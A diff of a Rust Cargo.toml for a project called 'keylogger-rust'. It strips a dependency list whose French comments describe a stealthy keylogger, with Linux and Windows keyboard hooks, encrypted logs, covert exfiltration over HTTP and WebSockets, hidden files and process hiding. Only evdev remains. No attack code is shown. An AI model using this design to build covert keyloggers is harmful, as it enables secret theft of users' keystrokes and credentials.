@@ -1,34 +1,7 @@
 [package]
-name = "keylogger-rust"
+name = "Victim-keylogger-rust"
 version = "0.1.0"
 edition = "2021"
 
 [dependencies]
-# Interface CLI
-clap = { version = "4.4", features = ["derive"] }
-colored = "2.0"
-inquire = "0.6"
-
-# Keylogging furtif
-evdev = "0.12"   # Linux (capture clavier via /dev/input/eventX)
-winapi = { version = "0.3", features = ["winuser"] }  # Windows (SetWindowsHookEx)
-
-# Sécurité et chiffrement
-aes-gcm = "0.10.3"    # Chiffrement AES-GCM authentifié
-rand = "0.8"          # Génération de clés aléatoires
-zeroize = "1.6"	      # Effacement sécurié de la clé en mémoire
-sha2 = "0.10"         # Hachage SHA256
-pbkdf2 = "0.12"       # Derivation de clé à partir de la passphrase
-serde = { version = "1.0", features = ["derive"] }
-serde_json = "1.0"
-hex = "0.4"
-
-# Exfiltration furtive des logs
-reqwest = { version = "0.11", features = ["blocking", "json"] }  # Envoi via HTTP
-tokio = { version = "1", features = ["full"] }  # Asynchronisme
-websocket = "0.26"   # Envoi des logs via WebSockets
-rdev = "0.5"
-
-# Persistance et gestion des fichiers
-dirs = "5.0"          # Gestion des chemins de fichiers cachés
-sysinfo = "0.29"      # Récupération d'infos système (ex: masquer le process)
+evdev = "0.12"
